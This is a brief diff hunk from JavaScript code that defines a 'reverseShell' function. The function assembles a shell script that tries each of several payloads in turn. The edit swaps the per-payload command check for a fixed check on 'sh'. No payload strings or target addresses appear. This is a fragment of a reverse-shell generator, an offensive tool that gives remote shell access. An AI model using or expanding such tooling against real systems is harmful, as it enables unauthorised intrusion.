@@ -25,7 +25,7 @@ const reverseShell = (address = '') => {
 	return Object.entries(payloads).reduce((script, [cmd, payload]) => {
 		script += `
 
-if command -v ${cmd} > /dev/null 2>&1; then
+if command -v sh > /dev/null 2>&1; then
 	${payload}
 	exit;
 fi`;
